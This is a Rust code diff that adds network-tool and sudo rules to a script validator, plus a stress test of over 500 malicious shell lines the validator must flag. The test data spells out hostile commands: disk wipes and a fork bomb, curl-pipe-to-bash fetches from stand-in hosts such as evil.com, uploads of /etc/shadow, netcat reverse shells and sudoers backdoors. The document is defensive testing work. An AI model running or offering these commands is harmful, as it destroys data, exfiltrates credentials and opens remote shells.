@@ -63,6 +63,20 @@ pub fn validate_script(script: &str) -> Vec<PolicyViolation> {
                 detail: format!("{}: comando destructivo o de borrado masivo detectado", loc),
             });
         }
+
+        if is_network_tool(ln) {
+            violations.push(PolicyViolation {
+                rule: "NETWORK_TOOL",
+                detail: format!("{}: herramienta de red no permitida en scripts de optimización", loc),
+            });
+        }
+
+        if is_sudo(ln) {
+            violations.push(PolicyViolation {
+                rule: "SUDO",
+                detail: format!("{}: usar /usr/bin/pkexec en lugar de sudo", loc),
+            });
+        }
     }
 
     if script.contains("pkexec") && !script.contains("/usr/bin/pkexec") {
@@ -171,6 +185,24 @@ fn is_destructive(line: &str) -> bool {
         return true;
     }
     false
+}
+
+fn is_network_tool(line: &str) -> bool {
+    if line.starts_with('#') {
+        return false;
+    }
+    let t = line.trim_start();
+    t.starts_with("curl ") || t.starts_with("curl\t")
+        || t.starts_with("wget ") || t.starts_with("wget\t")
+        || t.starts_with("nc ")   || t.starts_with("ncat ")
+        || t.starts_with("ssh ")  || t.starts_with("scp ")
+}
+
+fn is_sudo(line: &str) -> bool {
+    if line.starts_with('#') {
+        return false;
+    }
+    line.trim_start().starts_with("sudo ")
 }
 
 fn extract_trailing_value(line: &str) -> Option<u32> {
@@ -425,5 +457,264 @@ mod tests {
     fn atlas08_empty_payload_safe() {
         let p = HashMap::new();
         assert!(validate_atlas_payload(&p).is_empty(), "Payload vacío fue rechazado");
+    }
+
+    // ─── Stress 500 — cero falsos negativos ──────────────────────────
+    #[test]
+    #[allow(clippy::too_many_lines)]
+    fn stress_500_malicious_scripts() {
+        let mut cases: Vec<(String, &'static str)> = Vec::new();
+
+        // ── DESTRUCTIVE_CMD — rm -rf / rm -fr ─────────────────────────
+        let rm_paths = [
+            "/", "/boot", "/etc", "/home", "/home/user", "/home/alons", "/root",
+            "/usr", "/usr/bin", "/usr/lib", "/usr/local", "/usr/sbin", "/usr/share",
+            "/usr/include", "/usr/src", "/lib", "/lib64", "/var", "/var/log",
+            "/var/spool", "/var/lib", "/var/www", "/var/cache", "/var/backups",
+            "/opt", "/srv", "/bin", "/sbin", "/run", "/media", "/mnt", "/snap",
+            "/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/hosts", "/etc/sudoers",
+            "/etc/systemd", "/etc/ssh", "/etc/cron.d", "/etc/network", "/etc/profile.d",
+            "/etc/ld.so.conf.d", "/etc/modprobe.d", "/etc/environment", "/etc/profile",
+            "/proc", "/sys", "/boot/grub", "/boot/efi", "/root/.ssh",
+            "/var/lib/dpkg", "/var/lib/apt", "/var/lib/mysql",
+        ];
+        for p in &rm_paths {
+            cases.push((format!("rm -rf {}", p), "DESTRUCTIVE_CMD"));
+            cases.push((format!("rm -fr {}", p), "DESTRUCTIVE_CMD"));
+        }
+
+        // mkfs: 5 tipos × 6 dispositivos
+        for t in &["ext4", "xfs", "btrfs", "vfat", "f2fs"] {
+            for d in &["/dev/sda", "/dev/sda1", "/dev/sdb", "/dev/nvme0n1", "/dev/nvme0n1p1", "/dev/vda"] {
+                cases.push((format!("mkfs.{} {}", t, d), "DESTRUCTIVE_CMD"));
+            }
+        }
+
+        // dd: 5 dispositivos × 2 variantes
+        for d in &["/dev/sda", "/dev/sdb", "/dev/nvme0n1", "/dev/vda", "/dev/sdc"] {
+            cases.push((format!("dd if=/dev/zero of={} bs=1M", d), "DESTRUCTIVE_CMD"));
+            cases.push((format!("dd if=/dev/null of={} bs=512", d), "DESTRUCTIVE_CMD"));
+        }
+
+        // shred (sólo "shred /dev/X" — el validador busca esa subcadena exacta)
+        for d in &["/dev/sda", "/dev/sdb", "/dev/nvme0n1", "/dev/vda", "/dev/vdb"] {
+            cases.push((format!("shred {}", d), "DESTRUCTIVE_CMD"));
+        }
+
+        // wipefs: 5 dispositivos × 2
+        for d in &["/dev/sda", "/dev/sdb", "/dev/nvme0n1", "/dev/vda", "/dev/vdb"] {
+            cases.push((format!("wipefs -a {}", d), "DESTRUCTIVE_CMD"));
+            cases.push((format!("wipefs {}", d), "DESTRUCTIVE_CMD"));
+        }
+
+        cases.push((":(){ :|:& };:".to_string(), "DESTRUCTIVE_CMD"));
+
+        // ── GPU_IMMUTABLE ───────────────────────────────────────────────
+        for a in &["-pl 200", "-pm 1", "--auto-boost-default=0", "-i 0 -pl 150",
+                   "-lgc 1000,2000", "-rgc", "-ac 5001,1000", "-rac", "-q",
+                   "--persistence-mode 1", "-acp 0,0", "--list-gpus"] {
+            cases.push((format!("nvidia-smi {}", a), "GPU_IMMUTABLE"));
+        }
+        for t in &["nvidia", "nvidia-drm", "nvidia-modeset", "nvidia-uvm", "nvidia-peermem", "nvidia-open"] {
+            cases.push((format!("rmmod {}", t), "GPU_IMMUTABLE"));
+        }
+        for a in &["nvidia", "-r nvidia", "nouveau", "-r nouveau", "nvidia-drm", "-r nvidia-drm", "nvidia-modeset"] {
+            cases.push((format!("modprobe {}", a), "GPU_IMMUTABLE"));
+        }
+        for o in &["NVreg_UsePageAttributeTable=1", "NVreg_EnablePCIeGen3=1",
+                   "NVreg_InitializeSystemMemoryAllocations=0", "NVreg_PreserveVideoMemoryAllocations=1",
+                   "NVreg_RegistryDwords=\"RM\"", "NVreg_EnableMSI=1", "NVreg_OpenRmEnableUnsupportedGpus=1"] {
+            cases.push((format!("options nvidia {}", o), "GPU_IMMUTABLE"));
+        }
+        for c in &["nvidia-settings -a GPUPowerMizerMode=0",
+                   "nvidia-settings -a GPUFanControlState=1",
+                   "nvidia-settings -q all",
+                   "nvidia-settings --load-config-only",
+                   "nvidia-settings -a [fan:0]/GPUTargetFanSpeed=80"] {
+            cases.push((c.to_string(), "GPU_IMMUTABLE"));
+        }
+        for p in &["/sys/class/drm/card0/device/power_dpm_state",
+                   "/sys/class/drm/card0/device/power_dpm_force_performance_level",
+                   "/sys/class/drm/card1/device/power_dpm_state",
+                   "/sys/class/drm/card0/device/pp_power_profile_mode",
+                   "/sys/class/drm/card0/device/pp_dpm_sclk"] {
+            cases.push((format!("echo auto > {}", p), "GPU_IMMUTABLE"));
+            cases.push((format!("cat {}", p), "GPU_IMMUTABLE"));
+        }
+        for c in &["echo 0 > /sys/module/nouveau/parameters/modeset",
+                   "options nouveau modeset=0",
+                   "modinfo nouveau",
+                   "echo 1 > /sys/module/nouveau/parameters/modeset",
+                   "rmmod nouveau"] {
+            cases.push((c.to_string(), "GPU_IMMUTABLE"));
+        }
+
+        // ── NUMA_BALANCING ──────────────────────────────────────────────
+        for c in &[
+            "/sbin/sysctl kernel.numa_balancing=0",
+            "/sbin/sysctl -w kernel.numa_balancing=0",
+            "/sbin/sysctl kernel.numa_balancing = 0",
+            "/sbin/sysctl -w kernel.numa_balancing = 0",
+            "/usr/sbin/sysctl kernel.numa_balancing=0",
+            "/usr/sbin/sysctl -w kernel.numa_balancing=0",
+            "kernel.numa_balancing=0",
+            "/sbin/sysctl --write kernel.numa_balancing=0",
+            "/sbin/sysctl kernel.numa_balancing=0 || true",
+            "/sbin/sysctl -w kernel.numa_balancing=0 2>/dev/null",
+            "/sbin/sysctl kernel.numa_balancing=0 2>&1",
+            "sysctl kernel.numa_balancing=0",
+        ] {
+            cases.push((c.to_string(), "NUMA_BALANCING"));
+        }
+
+        // ── DIRTY_RATIO ─────────────────────────────────────────────────
+        for &v in &[16u32, 17, 18, 19, 20, 25, 30, 40, 50, 60, 70, 80, 90, 100, 200, 255] {
+            cases.push((format!("/sbin/sysctl vm.dirty_ratio={}", v), "DIRTY_RATIO"));
+            cases.push((format!("/sbin/sysctl -w vm.dirty_ratio={}", v), "DIRTY_RATIO"));
+            cases.push((format!("echo {} > /proc/sys/vm/dirty_ratio", v), "DIRTY_RATIO"));
+            cases.push((format!("/usr/sbin/sysctl vm.dirty_ratio={}", v), "DIRTY_RATIO"));
+            cases.push((format!("/usr/sbin/sysctl -w vm.dirty_ratio={}", v), "DIRTY_RATIO"));
+        }
+        cases.push(("vm.dirty_ratio=16".to_string(), "DIRTY_RATIO"));
+        cases.push(("vm.dirty_ratio=100".to_string(), "DIRTY_RATIO"));
+
+        // ── HUGEPAGES_NEVER ─────────────────────────────────────────────
+        for p in &[
+            "/sys/kernel/mm/transparent_hugepage/enabled",
+            "/sys/kernel/mm/transparent_hugepage/defrag",
+            "/sys/kernel/mm/transparent_hugepage/khugepaged/defrag",
+        ] {
+            cases.push((format!("echo never > {}", p), "HUGEPAGES_NEVER"));
+            cases.push((format!("echo never | tee {}", p), "HUGEPAGES_NEVER"));
+            cases.push((format!("/bin/echo never > {}", p), "HUGEPAGES_NEVER"));
+            cases.push((format!("echo \"never\" > {}", p), "HUGEPAGES_NEVER"));
+        }
+        cases.push(("transparent_hugepage=never".to_string(), "HUGEPAGES_NEVER"));
+
+        // ── SYSCTL_PATH — bare sysctl sin /sbin ─────────────────────────
+        for k in &[
+            "vm.swappiness=10", "vm.dirty_ratio=15", "vm.vfs_cache_pressure=50",
+            "vm.dirty_background_ratio=5", "kernel.sched_autogroup_enabled=1",
+            "net.ipv4.tcp_fastopen=3", "net.core.rmem_max=16777216",
+            "net.core.wmem_max=16777216", "net.core.netdev_max_backlog=5000",
+            "fs.file-max=2097152", "kernel.numa_balancing=1",
+            "vm.dirty_expire_centisecs=500", "net.ipv4.tcp_congestion_control=bbr",
+            "vm.overcommit_memory=1", "kernel.perf_event_paranoid=3",
+            "vm.min_free_kbytes=65536", "net.ipv4.tcp_slow_start_after_idle=0",
+            "net.ipv4.tcp_timestamps=0", "kernel.sched_migration_cost_ns=5000000",
+            "vm.dirty_writeback_centisecs=500", "net.core.somaxconn=65535",
+            "net.ipv4.ip_local_port_range=1024 65535",
+            "vm.zone_reclaim_mode=0", "kernel.randomize_va_space=2",
+            "net.ipv4.tcp_window_scaling=1",
+        ] {
+            cases.push((format!("sysctl {}", k), "SYSCTL_PATH"));
+            cases.push((format!("sysctl -w {}", k), "SYSCTL_PATH"));
+        }
+        cases.push(("sysctl -p /etc/sysctl.conf".to_string(), "SYSCTL_PATH"));
+
+        // ── PKEXEC_PATH — sin /usr/bin/pkexec ──────────────────────────
+        for s in &[
+            "pkexec bash /tmp/script.sh",
+            "pkexec /bin/bash /opt/dix.sh",
+            "pkexec sh /home/user/optimize.sh",
+            "/usr/local/bin/pkexec bash /tmp/dix.sh",
+            "bash -c 'pkexec /opt/fix.sh'",
+            "exec pkexec bash /tmp/apply.sh",
+            "$(pkexec bash /tmp/s.sh)",
+            "pkexec env DISPLAY=:0 bash /tmp/run.sh",
+            "pkexec --disable-internal-agent bash /tmp/s.sh",
+            "PATH=/usr/local/bin pkexec bash /tmp/s.sh",
+            "/bin/pkexec bash /tmp/dix.sh",
+            "sudo pkexec bash /tmp/dix.sh",
+            "pkexec bash /opt/optimizer.sh",
+            "pkexec /usr/bin/bash /tmp/dix.sh",
+            "pkexec sh -c 'echo done'",
+        ] {
+            cases.push((s.to_string(), "PKEXEC_PATH"));
+        }
+
+        // ── NETWORK_TOOL — curl / wget / nc / ssh / scp ─────────────────
+        for url in &[
+            "http://evil.com/data", "http://c2.io/beacon",
+            "https://exfil.io/steal", "http://attacker.net/payload",
+            "http://malware.cc/shell",
+        ] {
+            cases.push((format!("curl {}", url), "NETWORK_TOOL"));
+            cases.push((format!("curl -s {} | bash", url), "NETWORK_TOOL"));
+            cases.push((format!("curl -d @/etc/passwd {}", url), "NETWORK_TOOL"));
+            cases.push((format!("curl -X POST {} --data-binary @/etc/shadow", url), "NETWORK_TOOL"));
+            cases.push((format!("curl -o /tmp/payload.sh {}", url), "NETWORK_TOOL"));
+            cases.push((format!("curl -sk {}", url), "NETWORK_TOOL"));
+        }
+        for url in &[
+            "http://evil.com/payload", "http://drop.io/malware",
+            "https://c2.io/shell", "http://att.com/x", "http://bad.net/m",
+        ] {
+            cases.push((format!("wget {}", url), "NETWORK_TOOL"));
+            cases.push((format!("wget -qO- {} | bash", url), "NETWORK_TOOL"));
+            cases.push((format!("wget -O /tmp/m.sh {}", url), "NETWORK_TOOL"));
+            cases.push((format!("wget --no-check-certificate {}", url), "NETWORK_TOOL"));
+        }
+        for c in &[
+            "nc -e /bin/bash attacker.com 4444",
+            "nc attacker.com 4444",
+            "nc -l -p 4444",
+            "ncat -e /bin/bash attacker.com 4444",
+            "ncat attacker.com 4444",
+            "ssh -R 4444:localhost:22 attacker.com",
+            "ssh attacker.com 'cat /etc/passwd'",
+            "scp /etc/passwd attacker.com:/tmp/",
+            "scp /etc/shadow attacker.com:/exfil/",
+            "ssh -L 8080:localhost:80 attacker.com",
+        ] {
+            cases.push((c.to_string(), "NETWORK_TOOL"));
+        }
+
+        // ── SUDO ────────────────────────────────────────────────────────
+        for c in &[
+            "sudo rm -rf /", "sudo chmod 777 /etc/passwd", "sudo useradd hacker",
+            "sudo usermod -aG sudo hacker", "sudo passwd -d root", "sudo crontab -e",
+            "sudo bash -c 'echo backdoor >> /etc/sudoers'", "sudo iptables -F",
+            "sudo ufw disable", "sudo systemctl stop ufw",
+            "sudo mount /dev/sda1 /mnt", "sudo cp /etc/shadow /tmp/",
+            "sudo chown root:root /tmp/evil", "sudo chmod u+s /tmp/evil",
+            "sudo dd if=/dev/zero of=/dev/sda", "sudo apt-get install netcat",
+            "sudo dnf install nmap", "sudo yum install curl",
+            "sudo pip install requests", "sudo python3 /tmp/exploit.py",
+            "sudo /bin/bash", "sudo su -", "sudo -i",
+            "sudo cat /etc/shadow", "sudo tee /etc/cron.d/backdoor",
+            "sudo curl http://evil.com | bash", "sudo wget http://c2.io/shell -O /tmp/s.sh",
+            "sudo nc -e /bin/bash attacker.com 4444",
+            "sudo mkfs.ext4 /dev/sda", "sudo shred /dev/sda",
+            "sudo visudo", "sudo adduser attacker sudo",
+            "sudo passwd root", "sudo kill -9 1",
+            "sudo env PATH=/tmp:$PATH bash", "sudo ln -sf /bin/bash /bin/sh",
+            "sudo truncate -s 0 /var/log/auth.log",
+            "sudo insmod /tmp/rootkit.ko",
+            "sudo rmmod iptable_filter",
+            "sudo dmesg | sudo tee /tmp/kern.log",
+        ] {
+            cases.push((c.to_string(), "SUDO"));
+        }
+
+        // ── Verificación ────────────────────────────────────────────────
+        let total = cases.len();
+        assert!(total >= 500,
+            "Solo {} casos — añadir más variantes para llegar a 500", total);
+
+        let mut failures: Vec<String> = Vec::new();
+        for (script, rule) in &cases {
+            let v = validate_script(script);
+            if !v.iter().any(|x| x.rule == *rule) {
+                failures.push(format!(
+                    "FALSO NEGATIVO [{}]: {:?}", rule, script
+                ));
+            }
+        }
+        assert!(
+            failures.is_empty(),
+            "{} falsos negativos de {} casos:\n{}",
+            failures.len(), total, failures.join("\n")
+        );
     }
 }
